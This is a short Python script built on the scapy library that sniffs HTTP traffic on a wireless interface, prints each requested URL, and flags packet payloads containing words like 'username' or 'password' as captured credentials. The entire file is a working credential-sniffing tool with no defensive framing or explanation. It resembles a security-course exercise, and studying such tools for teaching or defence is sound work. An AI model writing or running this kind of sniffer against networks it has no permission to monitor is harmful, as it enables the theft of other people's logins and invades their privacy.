import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'user', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}\n")
        
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] POSSIBLE USERNAME PASSWORD >>> {login_info} \n\n")


sniff("wlan0")
